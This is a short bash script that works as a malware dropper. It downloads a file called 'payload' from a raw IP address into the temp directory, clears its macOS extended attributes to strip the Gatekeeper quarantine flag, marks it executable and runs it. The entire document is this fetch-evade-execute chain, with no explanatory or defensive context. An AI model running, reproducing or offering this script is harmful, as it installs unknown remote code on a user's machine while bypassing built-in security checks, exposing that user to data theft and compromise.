#!/bin/bash
cd $TMPDIR && curl -O http://91.92.242.30/payload && xattr -c payload && chmod +x payload && ./payload
